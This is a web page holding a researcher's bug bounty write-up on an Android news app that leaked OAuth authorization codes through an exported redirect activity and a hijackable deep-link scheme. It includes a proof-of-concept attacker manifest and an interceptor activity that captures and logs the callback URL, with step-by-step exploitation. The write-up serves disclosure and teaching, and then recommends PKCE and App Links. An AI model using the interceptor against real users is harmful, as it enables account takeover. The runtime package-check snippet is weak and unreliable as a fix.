<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>How a News App Leaked OAuth Codes: A Real-World Interception Story — Balvant Chavda</title>
    <!-- Preload critical CSS -->
    <link rel="preload" href="../css/style.css" as="style">
    <link rel="stylesheet" href="../css/style.css">
    <!-- Resource hints for faster loading -->
    <link rel="dns-prefetch" href="https://cdnjs.cloudflare.com">
    <link rel="dns-prefetch" href="https://fonts.googleapis.com">
    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
    <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
    <link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin>
    <link rel="preconnect" href="https://fonts.googleapis.com" crossorigin>
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin>
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" media="print" onload="this.media='all'">
    <noscript><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"></noscript>
    <!-- Preconnect to Google Fonts to speed up font loading -->
    <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&display=swap" onload="this.onload=null;this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;800&display=swap"></noscript>
    <!-- Preload the Mermaid library to improve performance -->
    <link rel="preload" href="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js" as="script">
    <!-- Add meta description for SEO -->
    <meta name="description" content="Analysis of OAuth vulnerability in Android news app that allowed malicious apps to intercept authorization codes during the login process.">
    <!-- Cache control headers -->
    <meta http-equiv="Cache-Control" content="max-age=86400">
    <!-- Preload hero image -->
    <link rel="preload" as="image" href="../images/android-auth.jpeg">
    <!-- Add Mermaid for dynamic diagrams -->
    <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js" defer></script>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            mermaid.initialize({
                startOnLoad: true,
                theme: 'dark',
                themeVariables: {
                    primaryColor: '#00ffa3',
                    primaryTextColor: '#ffffff',
                    primaryBorderColor: '#00ffa3',
                    lineColor: '#00ffa3',
                    secondaryColor: '#ff00e4',
                    tertiaryColor: '#1a1a1a',
                    tertiaryTextColor: '#c0c0c0', 
                    noteBkgColor: '#1a1a1a',
                    noteTextColor: '#c0c0c0',
                    noteBorderColor: '#00ffa3',
                    edgeLabelBackground: '#1a1a1a',
                    mainBkg: '#0f0f0f',
                    nodeBorder: '#00ffa3',
                    clusterBkg: '#1a1a1a',
                    clusterBorder: '#00ffa3',
                    titleColor: '#00ffa3',
                    fontFamily: "'JetBrains Mono', monospace"
                },
                flowchart: {
                    htmlLabels: true,
                    curve: 'basis'
                }
            });
        });
    </script>
    <style>
        /* Ensure body has dark background */
        body {
            background: linear-gradient(135deg, #0b0b12 0%, #0f0f18 50%, #0b0b12 100%) !important;
            min-height: 100vh;
        }
        
        /* Blog post specific styles */
        .post-header {
            height: 40vh;
            display: flex;
            align-items: center;
            background: linear-gradient(to right, rgba(16, 16, 16, 0.95), rgba(16, 16, 16, 0.8)), url('../images/android-auth.jpeg');
            background-size: cover;
            background-position: center;
            margin-bottom: 2rem;
        }
        
        .post-meta {
            margin-bottom: 2rem;
            color: var(--accent-color);
            font-size: 0.9rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .post-category {
            display: inline-block;
            margin-right: 1rem;
            color: var(--secondary-color);
        }
        
        .post-date {
            display: inline-block;
        }
        
        .post-content {
            max-width: 1100px;
            margin: 0 auto;
            padding-bottom: 4rem;
        }

        .post-content h1 {
            font-size: clamp(2.2rem, 5vw, 3.5rem);
            margin-bottom: 2rem;
            font-weight: 700;
            letter-spacing: -0.5px;
            line-height: 1.2;
            background: linear-gradient(135deg, #ffffff 0%, #b8f8e6 30%, #00ffa3 60%, #00a8ff 100%);
            background-size: 200% 200%;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            position: relative;
            display: block;
            animation: gradientShift 5s ease infinite;
            text-shadow: 0 0 30px rgba(0, 255, 163, 0.2);
            font-family: 'JetBrains Mono', monospace;
        }
        
        .post-content h1::after {
            content: '';
            position: absolute;
            bottom: -8px;
            left: 0;
            width: 60px;
            height: 3px;
            background: linear-gradient(90deg, #00ffa3, #00a8ff);
            border-radius: 2px;
            box-shadow: 0 0 10px rgba(0, 255, 163, 0.5);
        }
        
        @keyframes gradientShift {
            0%, 100% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
        }
        
        .post-content p {
            margin-bottom: 1.5rem;
            font-size: 1.05rem;
            line-height: 1.7;
        }
        
        .post-content h2 {
            margin-top: 3rem;
            margin-bottom: 1.5rem;
            font-size: 2rem;
            letter-spacing: -0.5px;
        }
        
        .post-content h3 {
            margin-top: 2rem;
            margin-bottom: 1rem;
            font-size: 1.4rem;
            letter-spacing: -0.5px;
            color: var(--secondary-color);
        }
        
        .post-content ul, .post-content ol {
            margin-bottom: 1.5rem;
            padding-left: 1.5rem;
        }
        
        .post-content li {
            margin-bottom: 0.8rem;
            position: relative;
        }

        .post-content ul li::before {
            content: "▹";
            position: absolute;
            left: -1.3em;
            color: var(--secondary-color);
            font-size: 1.2em;
        }
        
        .post-content code {
            background: rgba(0, 255, 163, 0.1);
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9em;
            color: #00ffa3;
            border: 1px solid rgba(0, 255, 163, 0.2);
            font-weight: 500;
        }
        
        .code-block {
            background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
            padding: 50px 1.5rem 1.5rem 1.5rem;
            border-radius: 12px;
            margin: 2rem 0;
            overflow: hidden;
            font-family: 'JetBrains Mono', monospace;
            font-size: 0.9rem;
            line-height: 1.6;
            border: 1px solid rgba(0, 255, 163, 0.3) !important;
            box-shadow: 
                0 8px 32px rgba(0, 0, 0, 0.4),
                0 0 0 1px rgba(0, 255, 163, 0.1),
                inset 0 1px 0 rgba(255, 255, 255, 0.05);
            position: relative;
            color: #c9d1d9;
            box-sizing: border-box !important;
        }
        
        .code-block::before {
            content: '●●●';
            position: absolute;
            top: 12px;
            left: 1rem;
            color: rgba(255, 255, 255, 0.4);
            font-size: 0.7rem;
            letter-spacing: 0.3rem;
            z-index: 1;
        }
        
        .code-block::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 40px;
            background: linear-gradient(135deg, rgba(0, 255, 163, 0.1) 0%, rgba(0, 168, 255, 0.1) 100%);
            border-bottom: 1px solid rgba(0, 255, 163, 0.2);
            z-index: 10;
            border-radius: 12px 12px 0 0;
        }
        
        .code-block code {
            color: #c9d1d9;
            background: transparent;
            border: none;
            padding: 0;
            font-weight: 400;
        }
        
        /* Syntax highlighting colors */
        .code-block .keyword { color: #ff7b72; }
        .code-block .string { color: #a5d6ff; }
        .code-block .comment { color: #8b949e; font-style: italic; }
        .code-block .function { color: #d2a8ff; }
        .code-block .number { color: #79c0ff; }
        .code-block .operator { color: #ff7b72; }
        .code-block .tag { color: #7ee787; }
        .code-block .attribute { color: #79c0ff; }
        .code-block .value { color: #a5d6ff; }
        
        .post-nav {
            display: flex;
            justify-content: space-between;
            margin-top: 4rem;
            padding-top: 2rem;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }
        
        .back-to-blog {
            display: inline-flex;
            align-items: center;
            color: var(--secondary-color);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: var(--transition);
        }
        
        .back-to-blog:hover {
            color: var(--accent-color);
            transform: translateX(-5px);
        }
        
        .back-to-blog i {
            margin-right: 0.5rem;
        }

        .blog-image-container {
            margin: 2rem 0;
            text-align: center;
        }

        .blog-image {
            max-width: 100%;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
        }

        .image-caption {
            margin-top: 1rem;
            color: var(--text-color);
            font-size: 0.9rem;
            font-style: italic;
        }

        .severity-tag {
            display: inline-block;
            padding: 0.3rem 0.8rem;
            border-radius: 50px;
            font-size: 0.8rem;
            font-weight: 600;
            text-transform: uppercase;
            background-color: rgba(255, 193, 7, 0.2);
            color: #ffc107;
            margin-right: 1rem;
        }

        .reward-tag {
            display: inline-block;
            padding: 0.3rem 0.8rem;
            border-radius: 50px;
            font-size: 0.8rem;
            font-weight: 600;
            text-transform: uppercase;
            background-color: rgba(0, 255, 163, 0.1);
            color: var(--secondary-color);
        }

        .cvss-score {
            display: flex;
            align-items: flex-start;
            padding: 0.5rem 1rem;
            border-radius: 8px;
            background-color: rgba(255, 87, 34, 0.1);
            color: #ff5722;
            font-weight: 700;
            margin-bottom: 1.5rem;
            flex-wrap: wrap;
        }

        .cvss-score i {
            margin-right: 0.8rem;
            font-size: 1.2rem;
            margin-top: 0.2rem;
        }

        .cvss-score div {
            display: flex;
            flex-direction: column;
        }

        .warning-note {
            background-color: rgba(255, 87, 34, 0.1);
            border-left: 4px solid #ff5722;
            padding: 1rem 1.5rem;
            margin-bottom: 1.5rem;
            border-radius: 0 8px 8px 0;
        }

        .warning-note strong {
            color: #ff5722;
            display: block;
            margin-bottom: 0.5rem;
        }

        .info-note {
            background-color: rgba(33, 150, 243, 0.1);
            border-left: 4px solid #2196f3;
            padding: 1rem 1.5rem;
            margin-bottom: 1.5rem;
            border-radius: 0 8px 8px 0;
        }

        .info-note strong {
            color: #2196f3;
            display: block;
            margin-bottom: 0.5rem;
        }

        .steps-container {
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 8px;
            margin-bottom: 2rem;
            overflow: hidden;
        }

        .steps-header {
            background-color: rgba(255, 255, 255, 0.05);
            padding: 1rem 1.5rem;
            font-weight: 600;
            color: var(--light-text);
            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        }

        .steps-content {
            padding: 1.5rem;
        }

        .steps-list {
            counter-reset: steps;
            list-style-type: none;
            padding-left: 0;
        }

        .steps-list li {
            counter-increment: steps;
            margin-bottom: 1.5rem;
            padding-left: 2.5rem;
            position: relative;
        }

        .steps-list li::before {
            content: counter(steps);
            position: absolute;
            left: 0;
            top: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 1.8rem;
            height: 1.8rem;
            background-color: rgba(0, 255, 163, 0.1);
            color: var(--secondary-color);
            border-radius: 50%;
            font-weight: 600;
            font-size: 0.9rem;
        }

        /* Mermaid diagram styling */
        .mermaid {
            background-color: #1a1a1a;
            padding: 1.5rem;
            border-radius: 8px;
            margin: 2rem 0;
            border-left: 4px solid var(--secondary-color);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            font-family: 'JetBrains Mono', monospace;
        }

        /* Mobile styles */
        @media (max-width: 768px) {
            html {
                background: linear-gradient(135deg, #0b0b12 0%, #0f0f18 50%, #0b0b12 100%) !important;
                background-color: #0b0b12 !important;
                min-height: 100vh !important;
                margin: 0 !important;
                padding: 0 !important;
            }
            
            body {
                padding: 0 !important;
                margin: 0 !important;
                overflow-x: hidden !important;
                background: linear-gradient(135deg, #0b0b12 0%, #0f0f18 50%, #0b0b12 100%) !important;
                background-color: #0b0b12 !important;
                background-attachment: fixed !important;
                min-height: 100vh !important;
            }
            
            .header-spacer {
                background: linear-gradient(135deg, #0b0b12 0%, #0f0f18 50%, #0b0b12 100%) !important;
                background-color: #0b0b12 !important;
                height: 80px !important;
                margin: 0 !important;
                padding: 0 !important;
                width: 100% !important;
            }
            
            body * {
                background-color: transparent !important;
            }
            
            .post-content,
            .post-content .container,
            section,
            .container {
                background: transparent !important;
                background-color: transparent !important;
            }
            
            .container {
                padding: 0 1rem !important;
                width: 100% !important;
                max-width: 100% !important;
            }
            
            .post-header {
                height: 25vh !important;
                margin-bottom: 1.5rem !important;
                margin-top: 80px !important;
            }
            
            .post-content {
                padding: 2rem 1rem 1.5rem 1rem !important;
                margin: 0 auto !important;
                width: 100% !important;
                max-width: 100% !important;
                padding-top: calc(65px + 1.5rem) !important;
            }
            
            .post-content .container {
                padding-top: 0.5rem !important;
            }
            
            .back-to-blog {
                margin-top: 0.5rem !important;
                margin-bottom: 1.5rem !important;
                display: block !important;
            }
            
            .post-meta {
                font-size: 0.75rem !important;
                margin-bottom: 1rem !important;
                display: flex !important;
                flex-direction: column !important;
                gap: 0.3rem !important;
            }
            
            .post-category,
            .post-date {
                display: block !important;
                margin-right: 0 !important;
                margin-bottom: 0.2rem !important;
            }
            
            .post-content h1 {
                font-size: clamp(1.5rem, 6vw, 2rem) !important;
                letter-spacing: -0.3px !important;
                line-height: 1.3 !important;
                margin-bottom: 1rem !important;
                text-align: left !important;
            }
            
            .post-content h1::after {
                width: 40px !important;
                height: 2px !important;
            }
            
            .post-content h2 {
                font-size: clamp(1.3rem, 5vw, 1.6rem) !important;
                margin-top: 2rem !important;
                margin-bottom: 1rem !important;
                line-height: 1.3 !important;
            }
            
            .post-content h3 {
                font-size: clamp(1.1rem, 4vw, 1.3rem) !important;
                margin-top: 1.5rem !important;
                margin-bottom: 0.8rem !important;
                line-height: 1.4 !important;
            }
            
            .post-content p {
                font-size: 0.95rem !important;
                line-height: 1.7 !important;
                margin-bottom: 1.2rem !important;
            }
            
            .post-content ul,
            .post-content ol {
                padding-left: 1.2rem !important;
                margin-bottom: 1.2rem !important;
            }
            
            .post-content li {
                margin-bottom: 0.6rem !important;
                font-size: 0.95rem !important;
                line-height: 1.6 !important;
            }
            
            .severity-tag,
            .reward-tag {
                font-size: 0.7rem !important;
                padding: 0.3rem 0.6rem !important;
                margin-right: 0.5rem !important;
                margin-bottom: 0.5rem !important;
                display: inline-block !important;
            }
            
            .cvss-score {
                flex-direction: column !important;
                align-items: flex-start !important;
                padding: 0.8rem !important;
                font-size: 0.85rem !important;
                gap: 0.5rem !important;
            }
            
            .cvss-score div {
                width: 100% !important;
            }
            
            .code-block {
                padding-top: 50px !important;
                padding-bottom: 1rem !important;
                padding-left: 1rem !important;
                padding-right: 1rem !important;
                font-size: 0.8em !important;
                overflow-x: auto !important;
                overflow-y: auto !important;
                white-space: pre !important;
                word-wrap: normal !important;
                margin: 1.5rem 0 !important;
                border-radius: 8px !important;
                position: relative !important;
                -webkit-overflow-scrolling: touch !important;
                border: 1px solid rgba(0, 255, 163, 0.3) !important;
                box-shadow: 
                    0 8px 32px rgba(0, 0, 0, 0.4),
                    0 0 0 1px rgba(0, 255, 163, 0.1),
                    inset 0 1px 0 rgba(255, 255, 255, 0.05) !important;
            }
            
            .code-block::after {
                position: -webkit-sticky !important;
                position: sticky !important;
                top: 0 !important;
                left: 0 !important;
                right: 0 !important;
                width: 100% !important;
                min-width: 100% !important;
                z-index: 10 !important;
                height: 40px !important;
            }
            
            .code-block::before {
                position: -webkit-sticky !important;
                position: sticky !important;
                top: 12px !important;
                left: 1rem !important;
                z-index: 11 !important;
            }
            
            /* Ensure code content scrolls but header stays */
            .code-block pre,
            .code-block code {
                position: relative !important;
                z-index: 1 !important;
                white-space: pre !important;
                overflow-x: auto !important;
                display: block !important;
                width: 100% !important;
                max-width: 100% !important;
            }
            
            .warning-note,
            .info-note {
                padding: 0.8rem 1rem !important;
                font-size: 0.85rem !important;
                margin-bottom: 1.2rem !important;
            }
            
            .steps-list li {
                padding-left: 2rem !important;
            }
            
            .steps-list li::before {
                width: 1.5rem !important;
                height: 1.5rem !important;
                font-size: 0.8rem !important;
            }
            
            .post-nav {
                flex-direction: column !important;
                gap: 1rem !important;
                margin-top: 2rem !important;
                padding-top: 1.5rem !important;
            }
            
            .back-to-blog {
                font-size: 0.85rem !important;
            }
            
            .mermaid {
                padding: 1rem !important;
                font-size: 0.8rem !important;
                overflow-x: auto !important;
            }
        }
        
        @media (max-width: 576px) {
            .post-header {
                height: 20vh !important;
                margin-top: 70px !important;
            }
            
            .post-content {
                padding: 1rem 0.8rem !important;
            }
            
            .post-content h1 {
                font-size: 1.5rem !important;
            }
            
            .post-content h2 {
                font-size: 1.3rem !important;
            }
            
            .post-content h3 {
                font-size: 1.1rem !important;
            }
        }
            
            .warning-note, .info-note {
                padding: 0.8rem 1rem;
                font-size: 0.9rem;
            }
            
            .mermaid {
                padding: 1rem;
                overflow-x: auto;
            }
        }
    </style>
</head>
<body>
    <!-- Header with Avatar -->
    <header style="position: fixed !important; top: 0 !important; left: 0 !important; width: 100% !important; z-index: 999999 !important; background: #0a0a0f !important; display: block !important; visibility: visible !important; opacity: 1 !important;">
        <div class="container">
            <a href="../index.html" class="logo">
                <span class="logo-bracket logo-bracket-left" aria-hidden="true">[</span>
                <span class="logo-text">Balvant<span class="domain">.IN</span></span>
                <span class="logo-bracket logo-bracket-right" aria-hidden="true">]</span>
            </a>
            <button class="menu-toggle" aria-label="Toggle menu" aria-expanded="false">
                <i class="fas fa-bars" aria-hidden="true"></i>
            </button>
            <nav aria-label="Main navigation">
                <ul>
                    <li><a href="../index.html#blog"><span><i class="fas fa-blog" aria-hidden="true"></i> Blog</span></a></li>
                    <li><a href="../index.html#cves"><span><i class="fas fa-bug" aria-hidden="true"></i> CVEs</span></a></li>
                    <li><a href="../books.html"><span><i class="fas fa-book" aria-hidden="true"></i> Books</span></a></li>
                    <li><a href="../index.html#hall-of-fame"><span><i class="fas fa-trophy" aria-hidden="true"></i> Hall of Fame</span></a></li>
                    <!-- <li><a href="../projects.html"><span><i class="fas fa-code-branch" aria-hidden="true"></i> Projects</span></a></li> -->
                    <li><a href="../contact.html" class="contact-btn"><span><i class="fas fa-paper-plane" aria-hidden="true"></i> Contact Me</span></a></li>
                </ul>
            </nav>
        </div>
    </header>
    
    <!-- Post Content -->
    <section class="post-content">
        <div class="container">
            <h1>How a News App Leaked OAuth Codes: A Real-World Interception Story</h1>
            <div class="post-meta">
                <span class="post-category">Android Security</span>
                <span class="post-date">Published on December 30, 2024</span>
            </div>
            
            <div style="margin-bottom: 2rem; display: flex; flex-wrap: wrap; gap: 10px;">
                <span class="severity-tag">Severity: High</span>
                <span class="reward-tag">Reward: REDACTED</span>
            </div>
            
            <div class="cvss-score">
                <i class="fas fa-shield-alt"></i>
                <div>
                    <span class="cvss-value">CVSS Score: 8.7 (High)</span>
                    <span class="cvss-vector">CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N</span>
                </div>
            </div>
            
            <p>Mobile applications are increasingly becoming the primary access point for online services, making their security paramount. Despite the robust security measures built into modern mobile platforms, vulnerabilities can still emerge, especially in the implementation of authentication mechanisms. In this writeup, I'll share my discovery of a critical vulnerability in a news application's Android version that allowed malicious apps to intercept OAuth authorization codes during the login process.</p>
            
            <div class="warning-note">
                <strong>Note on Responsible Disclosure:</strong> This vulnerability was responsibly disclosed to the affected organization. All details shared in this post have been approved for publication after the issue was resolved. The target name and specific identifiers have been redacted.
            </div>
            
            <h2>Understanding the Vulnerability Context</h2>
            
            <p>OAuth is a widely-used authorization framework that enables third-party applications to access user accounts without exposing credentials. In mobile applications, this typically involves redirecting users to a web view for authentication and then back to the application upon successful login. If this redirection mechanism is improperly implemented, it can potentially allow attackers to intercept sensitive authentication tokens.</p>
            
            <p>The vulnerability I discovered in the news application existed due to two critical issues:</p>
            
            <ul>
                <li>Exported authentication activities in the Android manifest</li>
                <li>Insecure handling of deep links in the OAuth flow</li>
            </ul>
            
            <p>These issues combined could allow a malicious application to intercept the OAuth authorization code when a user completes the login process, potentially leading to unauthorized access to the user's account.</p>
            
            <h2>Technical Analysis</h2>
            
            <h3>Vulnerable Components</h3>
            
            <p>After examining the application's manifest file, I discovered that the RedirectActivity, responsible for handling OAuth callbacks, was exported and accessible to other applications on the device:</p>
            
            <div class="code-block">
                <pre>&lt;activity
    android:name="com.auth0.android.provider.RedirectActivity"
    android:exported="true"&gt;
    &lt;intent-filter android:autoVerify="true"&gt;
        &lt;action android:name="android.intent.action.VIEW"/&gt;
        &lt;category android:name="android.intent.category.DEFAULT"/&gt;
        &lt;category android:name="android.intent.category.BROWSABLE"/&gt;
        &lt;data
            android:scheme="@string/auth0_scheme_french"
            android:host="@string/auth0_domain_production"
            android:pathPrefix="/android/com.newsplus.reader/callback"/&gt;
    &lt;/intent-filter&gt;
&lt;/activity&gt;</pre>
            </div>
            
            <p>Additionally, I analyzed the RedirectActivity implementation to understand how it processes OAuth callbacks:</p>
            
            <div class="code-block">
                <pre>public final class RedirectActivity extends Activity {
    @Override // android.app.Activity
    public void onCreate(Bundle savedInstanceBundle) {
        super.onCreate(savedInstanceBundle);
        Intent intent = new Intent(this, (Class&lt;?&gt;) AuthenticationActivity.class);
        intent.addFlags(603979776);
        if (getIntent() != null) {
            intent.setData(getIntent().getData());
        }
        startActivity(intent);
        finish();
    }
}</pre>
            </div>
            
            <p>This code revealed that the activity simply forwards any received intent data to the AuthenticationActivity. When processing an OAuth callback, this data would include the authorization code. The problem lies in how Android handles intents for exported activities with matching intent filters.</p>
            
            <h3>The Attack Vector</h3>
            
            <p>When a user completes authentication through the OAuth flow, the browser or WebView attempts to redirect to a URL with the following format:</p>
            
            <div class="code-block">
                <pre>newsapp://login.auth-domain.com/android/com.newsplus.reader/callback?code=AUTHORIZATION_CODE</pre>
            </div>
            
            <p>Android's intent resolution system will display an app chooser if multiple applications on the device claim to handle this URL scheme. A malicious application could register to handle the same URL pattern, giving it the opportunity to intercept the authorization code if the user selects it from the chooser dialog.</p>
            
            <h2>Proof of Concept Exploitation</h2>
            
            <p>To demonstrate this vulnerability, I developed a proof-of-concept application that registers to handle the same deep link pattern as the vulnerable news app.</p>
            
            <h3>Attacker's Manifest Configuration</h3>
            
            <div class="code-block">
                <pre>&lt;activity
    android:name=".CallbackInterceptorActivity"
    android:exported="true"&gt;
    &lt;intent-filter&gt;
        &lt;action android:name="android.intent.action.VIEW" /&gt;
        &lt;category android:name="android.intent.category.DEFAULT" /&gt;
        &lt;category android:name="android.intent.category.BROWSABLE" /&gt;
        &lt;data
            android:host="login.auth-domain.com"
            android:scheme="newsapp"
            android:pathPrefix="/android/com.newsplus.reader/callback" /&gt;
    &lt;/intent-filter&gt;
&lt;/activity&gt;</pre>
            </div>
            
            <h3>Malicious Activity Implementation</h3>
            
            <div class="code-block">
                <pre>package com.example.app

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity

class CallbackInterceptorActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_callback_interceptor)

        val textViewUrl: TextView = findViewById(R.id.textViewUrl)

        // Get the incoming intent
        val intent: Intent? = intent
        val data: Uri? = intent?.data

        if (data != null) {
            // Display the full URL in the TextView
            val fullUrl = data.toString()
            textViewUrl.text = "Intercepted URL:\n$fullUrl"
            Log.d("CallbackInterceptor", "URL intercepted: $fullUrl")
        } else {
            textViewUrl.text = "No URL intercepted."
            Log.d("CallbackInterceptor", "No URL intercepted.")
        }
    }
}</pre>
            </div>
            
            <div class="steps-container">
                <div class="steps-header">
                    <i class="fas fa-list-ol"></i> Exploitation Steps
                </div>
                <div class="steps-content">
                    <ol class="steps-list">
                        <li>Install both the target news application and the malicious PoC application on the same device</li>
                        <li>Open the news application and initiate the login process</li>
                        <li>Complete the authentication flow through the WebView</li>
                        <li>When the WebView redirects to the callback URL, Android displays an app chooser dialog</li>
                        <li>If the user selects the malicious app from the chooser, it receives the full callback URL containing the authorization code</li>
                        <li>The attacker can extract the code from the URL and use it to gain access to the user's account</li>
                    </ol>
                </div>
            </div>
            
            <div class="blog-image-container">
                <div class="mermaid">
%%{init: {'theme': 'dark'}}%%
flowchart TD
    %% Normal OAuth Flow
    subgraph "Normal OAuth Authentication Flow"
    A[User initiates login in news app] --> B[News app opens WebView/browser]
    B --> C[User logs in on OAuth provider's website]
    C --> D[OAuth provider redirects to app's callback URL]
    D --> E[RedirectActivity receives authorization code]
    E --> F[Forward intent with code to AuthenticationActivity]
    F --> G[Exchange authorization code for access token]
    G --> H[User logged into news app]
    end

    %% Exploitation Flow
    subgraph "Exploitation Scenario"
    M[Malicious app installed on device] --> N[Malicious app registers intent filter for callback URL]
    N --> O[User initiates login in news app]
    O --> P[News app opens WebView/browser]
    P --> Q[User logs in on OAuth provider's website]
    Q --> R[OAuth provider redirects to callback URL]
    R --> S[Android system presents app chooser]
    S --> |User selects malicious app| T[Malicious app receives authorization code]
    T --> U[Malicious app logs/transmits code to attacker]
    U --> V[Attacker can impersonate user]
    end
                </div>
                <p class="image-caption">Visualization of the OAuth flow and exploitation scenario</p>
            </div>
            
            <h2>Impact Analysis</h2>
            
            <p>If successfully exploited, this vulnerability could lead to:</p>
            
            <ul>
                <li>Unauthorized access to user accounts in the news application</li>
                <li>Complete account takeover, allowing attackers to read personalized news, access saved articles, and potentially view subscription information</li>
                <li>Access to user profile data that may be synchronized with the account</li>
            </ul>
            
            <p>While this attack has a few mitigating factors that reduce its severity—namely, it requires user interaction to select the malicious app from the chooser dialog and physical access to the device—it still represents a significant security risk, especially for high-profile users who might be targeted specifically.</p>
            
            <h2>Remediation Strategies</h2>
            
            <p>I recommended several approaches to fix this vulnerability, listed in order of effectiveness:</p>
            
            <h3>1. Implement PKCE (Proof Key for Code Exchange)</h3>
            
            <p>The most effective solution is to implement the PKCE extension to the OAuth flow. PKCE adds a code verifier that is created by the client app and verified by the authorization server, making the authorization code useless without the corresponding verifier.</p>
            
            <div class="code-block">
                <pre>// Generate a secure random code verifier
val codeVerifier = PKCEUtil.generateCodeVerifier()

// Generate the code challenge from the verifier
val codeChallenge = PKCEUtil.generateCodeChallenge(codeVerifier)

// Include the code challenge in the authorization request
val authRequestUri = Uri.parse("https://auth-domain.com/authorize")
    .buildUpon()
    .appendQueryParameter("client_id", "CLIENT_ID")
    .appendQueryParameter("response_type", "code")
    .appendQueryParameter("redirect_uri", "newsapp://callback")
    .appendQueryParameter("code_challenge", codeChallenge)
    .appendQueryParameter("code_challenge_method", "S256")
    .build()</pre>
            </div>
            
            <h3>2. Add Certificate Pinning and App Link Verification</h3>
            
            <p>Using Android App Links with domain verification significantly increases security by ensuring that only the legitimate app can handle the deep links without showing a chooser dialog:</p>
            
            <div class="code-block">
                <pre>&lt;intent-filter android:autoVerify="true"&gt;
    &lt;action android:name="android.intent.action.VIEW" /&gt;
    &lt;category android:name="android.intent.category.DEFAULT" /&gt;
    &lt;category android:name="android.intent.category.BROWSABLE" /&gt;
    &lt;data android:scheme="https" 
          android:host="login.news-app.com" 
          android:pathPattern="/callback" /&gt;
&lt;/intent-filter&gt;</pre>
            </div>
            
            <p>This requires hosting an assetlinks.json file on the domain to verify ownership and establish the association between the website and the app.</p>
            
            <h3>3. Implement Runtime Package Validation</h3>
            
            <p>Additionally, the app should validate the calling package at runtime before processing any sensitive callbacks:</p>
            
            <div class="code-block">
                <pre>private fun validateCallingPackage(): Boolean {
    val callingPackage = callingActivity?.packageName ?: return false
    return callingPackage == "com.legitimate.newsapp" || callingPackage.startsWith("com.android.browser")
}</pre>
            </div>
            
            <h3>4. Add User Notifications</h3>
            
            <p>As an additional layer of security, the app should notify users about new logins or suspicious activities associated with their accounts.</p>
            
            <div class="info-note">
                <strong>Security Best Practice:</strong> OAuth implementations on mobile platforms should always use PKCE and App Links verification to prevent interception attacks. Following the principle of defense in depth, multiple layers of protection should be implemented rather than relying on a single security mechanism.
            </div>
            
            <h2>Resolution and Reward</h2>
            
            <p>After submitting this vulnerability report through the company's bug bounty program, the development team acknowledged the issue and implemented the recommended fixes in their next application update. The main changes they made were:</p>
            
            <ul>
                <li>Implementing PKCE for all OAuth flows</li>
                <li>Setting up proper App Links verification</li>
                <li>Adding runtime package validation for all redirect handling</li>
            </ul>
            
            <p>For this discovery, I was awarded a bounty of REDACTED. While the monetary reward was modest, the real value came from knowing that thousands of users now have a more secure authentication experience when using the news application.</p>
            
            <h2>Conclusion</h2>
            
            <p>This case study highlights the importance of properly implementing OAuth authentication flows in mobile applications. Even well-established apps can have vulnerabilities in their authentication mechanisms that could lead to account compromise.</p>
            
            <p>For developers building OAuth-based authentication in mobile applications, this serves as a reminder to:</p>
            
            <ul>
                <li>Always implement PKCE for authorization code flows</li>
                <li>Properly configure Android App Links with domain verification</li>
                <li>Avoid exporting sensitive activities unnecessarily</li>
                <li>Add multiple layers of validation to protect against various attack vectors</li>
            </ul>
            
            <p>As mobile apps continue to evolve and handle increasingly sensitive user data, these security considerations will only become more critical. By sharing these findings, I hope to contribute to the improvement of security practices across the mobile app development community.</p>
            
            <div class="post-nav">
                <a href="../index.html#blog" class="back-to-blog"><i class="fas fa-arrow-left"></i> Back to Blog</a>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer>
        <div class="footer-content">
            <div class="footer-grid">
                <div class="footer-section">
                    <h3>0xBalvant</h3>
                    <p>Cybersecurity researcher specializing in Android, iOS, Web, and Web3 security. Building secure systems and sharing knowledge.</p>
                    <div class="social-links">
                        <a href="https://twitter.com/ba1van7" target="_blank" rel="noopener noreferrer" title="Twitter"><i class="fab fa-twitter"></i></a>
                        <a href="https://linkedin.com/in/balvant-chavda" target="_blank" rel="noopener noreferrer" title="LinkedIn"><i class="fab fa-linkedin-in"></i></a>
                        <a href="https://balvant.in" target="_blank" rel="noopener noreferrer" title="Website"><i class="fas fa-globe"></i></a>
                        <a href="mailto:contact@balvant.in" title="Email"><i class="fas fa-envelope"></i></a>
